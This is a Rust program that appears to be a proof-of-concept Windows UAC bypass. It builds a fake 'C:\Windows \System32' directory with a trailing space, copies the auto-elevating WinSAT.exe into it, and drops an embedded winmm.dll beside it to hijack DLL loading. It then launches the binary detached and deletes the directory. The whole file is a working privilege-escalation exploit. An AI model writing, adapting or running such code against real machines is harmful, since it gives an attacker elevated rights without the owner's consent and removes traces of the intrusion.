use std::{fs, os::windows::process::CommandExt, process::Command};

static WINMM_DLL: &[u8] = std::include_bytes!(env!("CARGO_CDYLIB_FILE_DLL"));

const DETACHED_PROCESS: u32 = 0x00000008;

pub fn main() -> Result<(), Box<dyn std::error::Error>> {
    let windir = std::path::Path::new(r"C:\Windows\System32");
    let fake_windir = std::path::Path::new(r"C:\Windows \System32");

    println!("[+] Creating fake directory {}...", fake_windir.display());
    fs::create_dir_all(fake_windir.parent().unwrap())
        .and_then(|_| fs::create_dir_all(fake_windir))?;

    let winsat = &*windir.join("WinSAT.exe");
    let fake_winsat = &*fake_windir.join("WinSAT.exe");

    println!(
        "[+] Copying {} to {}...",
        winsat.display(),
        fake_winsat.display()
    );

    if let Err(err) = fs::copy(winsat, fake_winsat) {
        println!(
            "[!] Error copying {} to {}: {err}",
            winsat.display(),
            fake_winsat.display()
        );
        std::process::exit(1);
    };

    let fake_winmm = &*fake_windir.join("winmm.dll");

    println!("[+] Creating {}...", fake_winmm.display());
    if let Err(err) = fs::write(fake_winmm, WINMM_DLL) {
        println!("[!] Error writing {}: {err}", fake_winmm.display());
        std::process::exit(1);
    }

    println!("[+] Starting {}...", fake_winsat.display());

    Command::new("cmd.exe")
        .args(["/C", fake_winsat.to_str().unwrap()])
        .creation_flags(DETACHED_PROCESS)
        .spawn()?;

    if let Err(err) = fs::remove_dir_all(fake_windir) {
        println!("[!] Error removing {}: {err}", fake_windir.display());
        std::process::exit(1);
    }

    Ok(())
}
